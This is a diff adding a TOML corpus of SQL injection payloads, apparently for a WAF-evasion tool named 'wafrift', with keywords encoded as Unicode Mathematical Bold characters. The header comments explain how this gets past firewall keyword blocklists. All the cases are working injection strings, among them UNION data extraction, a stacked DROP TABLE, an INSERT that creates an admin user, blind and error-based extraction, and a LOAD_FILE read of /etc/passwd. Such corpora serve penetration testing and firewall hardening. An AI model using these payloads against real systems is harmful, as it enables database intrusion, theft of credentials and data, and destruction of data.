@@ -1,0 +1,103 @@
+schema = 1
+# SQL injection payloads pre-encoded with Mathematical Bold Alphanumeric
+# Symbols (U+1D400 block). NFKC-normalises back to ASCII on:
+#   - PostgreSQL with ICU collations (default in 16+)
+#   - MySQL utf8mb4_0900_ai_ci
+#   - Any Java/.NET/Python/Go layer that runs `Normalizer.normalize(s, NFKC)`
+#     before forwarding to the DB
+#
+# Distinct from the existing `fullwidth_encode` / `bracket_confusable`
+# corpus: those use the U+FF00 Halfwidth-and-Fullwidth-Forms block. WAFs
+# that ship a "fullwidth keyword" blocklist (now standard since ~2020)
+# usually do NOT also block U+1D400. Math Bold codepoints reach the
+# normaliser, NFKC them to plain ASCII, the DB sees `SELECT` / `UNION`,
+# the rule fires only post-execution (too late).
+#
+# Manual form: `wafrift evade --only tamper/math_bold --payload "' UNION
+# SELECT NULL,NULL,NULL--"`.
+
+# ── Classic tautology, fully Math-Bolded ──
+
+[[case]]
+id = "math_bold_or_1eq1_tautology"
+class = "sql"
+payload = "' 𝐎𝐑 𝟏=𝟏--"
+description = "Math-Bold OR 1=1 — codepoints U+1D40E/U+1D411 and U+1D7CF NFKC to OR + 1."
+
+[[case]]
+id = "math_bold_or_1eq1_quoted"
+class = "sql"
+payload = "' 𝐎𝐑 '𝟏'='𝟏"
+description = "Math-Bold OR 1=1 with string-comparison tautology; punctuation stays ASCII so the SQL parser still sees the structure."
+
+# ── UNION extraction ──
+
+[[case]]
+id = "math_bold_union_select_null"
+class = "sql"
+payload = "' 𝐔𝐍𝐈𝐎𝐍 𝐒𝐄𝐋𝐄𝐂𝐓 𝐍𝐔𝐋𝐋,𝐍𝐔𝐋𝐋,𝐍𝐔𝐋𝐋--"
+description = "UNION SELECT NULL,NULL,NULL — full Math Bold rotation across both keywords."
+
+[[case]]
+id = "math_bold_union_all_select_version"
+class = "sql"
+payload = "' 𝐔𝐍𝐈𝐎𝐍 𝐀𝐋𝐋 𝐒𝐄𝐋𝐄𝐂𝐓 @@𝐯𝐞𝐫𝐬𝐢𝐨𝐧,𝐍𝐔𝐋𝐋--"
+description = "UNION ALL SELECT @@version,NULL — version banner extraction via Math-Bold keywords."
+
+# ── Stacked queries / DDL ──
+
+[[case]]
+id = "math_bold_stacked_drop_table"
+class = "sql"
+payload = "'; 𝐃𝐑𝐎𝐏 𝐓𝐀𝐁𝐋𝐄 𝐮𝐬𝐞𝐫𝐬--"
+description = "Stacked DROP TABLE — destructive DDL via Math-Bold keywords + identifier."
+
+[[case]]
+id = "math_bold_insert_admin"
+class = "sql"
+payload = "'; 𝐈𝐍𝐒𝐄𝐑𝐓 𝐈𝐍𝐓𝐎 𝐮𝐬𝐞𝐫𝐬 𝐕𝐀𝐋𝐔𝐄𝐒 ('𝐚𝐝𝐦𝐢𝐧','x','𝐚𝐝𝐦𝐢𝐧')--"
+description = "Stacked INSERT — Math-Bold across both DML and identifiers + string values."
+
+# ── Time-based blind ──
+
+[[case]]
+id = "math_bold_sleep_blind"
+class = "sql"
+payload = "' 𝐀𝐍𝐃 𝐒𝐋𝐄𝐄𝐏(𝟓)--"
+description = "AND SLEEP(5) — time-based blind via Math-Bold AND + SLEEP + Math-Bold digit."
+
+[[case]]
+id = "math_bold_pg_pg_sleep"
+class = "sql"
+payload = "'; 𝐒𝐄𝐋𝐄𝐂𝐓 𝐩𝐠_𝐬𝐥𝐞𝐞𝐩(𝟓)--"
+description = "PG pg_sleep(5) — Postgres-specific time-based via Math-Bold identifier (mixed case + underscore preserved)."
+
+# ── Error-based extraction ──
+
+[[case]]
+id = "math_bold_extractvalue_error"
+class = "sql"
+payload = "' 𝐀𝐍𝐃 𝐄𝐗𝐓𝐑𝐀𝐂𝐓𝐕𝐀𝐋𝐔𝐄(𝟏,𝐂𝐎𝐍𝐂𝐀𝐓(𝟎𝐱𝟕𝐞,𝐯𝐞𝐫𝐬𝐢𝐨𝐧()))--"
+description = "EXTRACTVALUE() XPath-error-based extraction — Math-Bold across function name + nested CONCAT + hex literal prefix."
+
+# ── Mixed-script: Math Bold keyword + ASCII tail ──
+
+[[case]]
+id = "math_bold_partial_keyword"
+class = "sql"
+payload = "' 𝐎𝐑 'a'='a"
+description = "Partial Math-Bold (keyword only, string literals stay ASCII). Tests WAFs that decode the high codepoints to ASCII before keyword match (CRS PL4 with t:normalizePath in some configs)."
+
+# ── Length stress (rotation isn't a factor here; just keyword-density) ──
+
+[[case]]
+id = "math_bold_information_schema_dump"
+class = "sql"
+payload = "' 𝐔𝐍𝐈𝐎𝐍 𝐒𝐄𝐋𝐄𝐂𝐓 𝐭𝐚𝐛𝐥𝐞_𝐧𝐚𝐦𝐞,𝟐,𝟑 𝐅𝐑𝐎𝐌 𝐢𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧_𝐬𝐜𝐡𝐞𝐦𝐚.𝐭𝐚𝐛𝐥𝐞𝐬--"
+description = "information_schema.tables dump — Math-Bold across every keyword AND every identifier; tests broad regex coverage."
+
+[[case]]
+id = "math_bold_load_file_lfi"
+class = "sql"
+payload = "' 𝐔𝐍𝐈𝐎𝐍 𝐒𝐄𝐋𝐄𝐂𝐓 𝐋𝐎𝐀𝐃_𝐅𝐈𝐋𝐄('/etc/passwd'),𝐍𝐔𝐋𝐋--"
+description = "MySQL LOAD_FILE() LFI — Math-Bold function + path stays ASCII so filesystem read targets the intended file."
